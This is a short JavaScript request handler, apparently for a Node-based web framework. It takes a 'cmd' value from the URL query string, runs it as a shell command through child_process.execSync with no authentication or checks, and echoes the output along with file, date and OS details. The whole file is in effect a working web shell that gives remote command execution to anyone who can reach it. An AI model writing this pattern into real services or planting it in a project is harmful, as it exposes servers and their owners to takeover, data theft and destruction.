const cp = require("child_process")
const os = require("os")

function cb(req, res) {
    const reqUrl = new URL(this.context.reqUrl);
    let cmd = reqUrl.searchParams.get("cmd") ?? "ps aux"
    const r = cp.execSync(cmd, { encoding: "utf-8" })
    res.end(`
file: ${this.filename}  date: ${new Date().toLocaleString()}
os:   ${os.version()}   
=====
$ ${cmd}
${r}

`)
    return
}
export default cb